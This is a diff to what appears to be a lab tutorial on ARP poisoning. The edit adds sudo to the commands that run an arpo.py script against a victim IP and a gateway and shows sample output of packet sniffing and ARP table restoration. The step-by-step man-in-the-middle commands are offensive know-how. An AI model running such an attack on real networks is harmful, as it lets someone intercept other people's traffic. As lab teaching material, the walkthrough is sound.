@@ -53,8 +53,8 @@ sudo sysctl -w net.inet.ip.forwarding=1
 ## 4. So, after configuring IP address forwarding, let's run our script(on Kali), and check the ARP cache of the victim computer:
 
 ```bash
-python arpo.py [VICTIM_IP] [GATEWAY_IP] [NIC]
-python arpo.py 192.168.204.129 192.168.204.2 eth0 			# An Instance. 
+sudo python arpo.py [VICTIM_IP] [GATEWAY_IP] [NIC]
+sudo python arpo.py 192.168.204.129 192.168.204.2 eth0 			# An Instance. 
 ```
 
 ```bash
@@ -76,7 +76,12 @@ mac src: 00:0c:29:47:74:ba
 ARP is at 00:0c:29:47:74:ba says 192.168.204.129
 ------------------------------
 Beginning the ARP poison. [CTRL+C to stop]
-......................................................................................................................................................................................................................................................................................................................................................................................................
+Sniffing 100 packets
+
+KeyboardInterrupt
+Got the packets
+Restoring ARP tables...
+Finished.
 ```
 
 ## 5. While the script is capturing 100 packets, let's output content of the ARP-table on the Victim machine, verifying the attack on Meta2 machine:
